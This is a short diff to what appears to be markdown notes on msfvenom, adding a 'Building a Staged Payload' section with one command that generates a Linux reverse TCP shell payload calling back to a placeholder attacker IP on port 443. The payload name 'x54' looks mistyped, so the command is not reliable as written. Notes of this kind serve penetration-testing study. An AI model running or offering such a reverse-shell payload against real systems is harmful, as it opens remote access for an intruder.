@@ -30,4 +30,8 @@ msfvenom -f payloads
 ---
 
 ## Building a Staged Payload
-- 
+
+### Building it
+```bash
+msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443
+```
